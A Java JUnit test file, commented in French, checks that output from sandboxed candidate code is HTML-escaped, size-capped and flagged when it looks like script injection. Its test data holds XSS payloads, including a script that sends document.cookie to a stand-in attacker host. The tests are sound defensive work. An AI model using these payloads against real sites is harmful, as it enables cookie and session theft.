package fr.portail;

import static org.assertj.core.api.Assertions.assertThat;

import fr.portail.securite.Sortie;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

/**
 * La moitie oubliee du cours : ce que le bac a sable REND est hostile.
 *
 * <p>Le bac a sable a parfaitement fait son travail — le code n'a rien lu,
 * rien ecrit, rien appele. Et pourtant la chaine qui revient a ete ecrite
 * par le candidat, caractere par caractere.
 */
class SortieHostileTest {

    @Test
    @DisplayName("l'esperluette est echappee EN PREMIER, sinon on double les entites")
    void lOrdreDeLEchappement() {
        // ⚠️ Si `<` etait traite avant `&`, « &lt; » deviendrait « &amp;lt; »
        // au passage suivant : c'est le bogue classique du double
        // echappement, et il se voit sur cette seule entree.
        assertThat(Sortie.echapper("&")).isEqualTo("&amp;");
        assertThat(Sortie.echapper("<b>")).isEqualTo("&lt;b&gt;");
        assertThat(Sortie.echapper("a & <b>")).isEqualTo("a &amp; &lt;b&gt;");
        assertThat(Sortie.echapper("&lt;")).isEqualTo("&amp;lt;");
    }

    @Test
    @DisplayName("les cinq caracteres dangereux sont couverts")
    void lesCinqCaracteres() {
        assertThat(Sortie.echapper("& < > \" '"))
                .isEqualTo("&amp; &lt; &gt; &quot; &#39;");
    }

    @Test
    @DisplayName("un <script> du candidat ne sort jamais intact")
    void leScriptDuCandidat() {
        String attaque = "<script>fetch('http://attaquant/'+document.cookie)</script>";
        String affichable = Sortie.pourAffichage(attaque);

        assertThat(affichable).doesNotContain("<script>");
        assertThat(affichable).contains("&lt;script&gt;");
        assertThat(Sortie.suspecte(attaque)).isTrue();
    }

    @ParameterizedTest(name = "« {0} » est signale comme suspect")
    @ValueSource(strings = {
        "<script>alert(1)</script>",
        "<SCRIPT SRC=//x.y></SCRIPT>",
        "<img src=x onerror=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "javascript:alert(1)"
    })
    @DisplayName("la detection attrape les formes courantes, quelle que soit la casse")
    void laDetection(String sortie) {
        assertThat(Sortie.suspecte(sortie)).isTrue();
    }

    @ParameterizedTest(name = "« {0} » n'est pas suspect")
    @ValueSource(strings = {"bonjour", "42", "resultat : ok", "a < b"})
    @DisplayName("une sortie ordinaire n'est pas signalee")
    void laSortieOrdinaire(String sortie) {
        assertThat(Sortie.suspecte(sortie)).isFalse();
    }

    @Test
    @DisplayName("⚠️ « suspecte » NE PROTEGE PAS : c'est l'echappement qui protege")
    void laDetectionNeProtegePas() {
        // Une charge que le detecteur ne connait pas — et il y en a une
        // infinite. Elle passe le controle, et c'est normal : une liste
        // noire ne sera jamais complete.
        String inconnue = "<svg/onload=alert(1)>";
        assertThat(Sortie.suspecte(inconnue))
                .as("le detecteur ne connait pas cette forme, et c'est le point")
                .isFalse();

        // L'echappement, lui, ne connait rien et neutralise tout.
        assertThat(Sortie.pourAffichage(inconnue))
                .isEqualTo("&lt;svg/onload=alert(1)&gt;")
                .doesNotContain("<");
    }

    @Test
    @DisplayName("la taille de la sortie est choisie par le candidat, donc plafonnee")
    void lePlafond() {
        String enorme = "A".repeat(Sortie.PLAFOND * 3);
        String plafonnee = Sortie.plafonner(enorme);

        assertThat(plafonnee).hasSize(Sortie.PLAFOND + "…(tronque)".length());
        assertThat(Sortie.plafonner("court")).isEqualTo("court");
        assertThat(Sortie.plafonner(null)).isEmpty();
    }

    @Test
    @DisplayName("on plafonne PUIS on echappe, jamais l'inverse")
    void lOrdreDesDeuxGestes() {
        // ⚠️ Echapper d'abord multiplierait la taille par six avant de
        // couper : une sortie de 10 000 « < » deviendrait 40 000
        // caracteres en memoire avant d'etre reduite. Et couper APRES
        // echappement peut trancher une entite en deux (« &a »).
        String texte = "<".repeat(Sortie.PLAFOND * 2);
        String affichable = Sortie.pourAffichage(texte);

        assertThat(affichable).doesNotContain("<");
        assertThat(affichable.length())
                .isLessThanOrEqualTo(Sortie.PLAFOND * 4 + 16);
    }
}
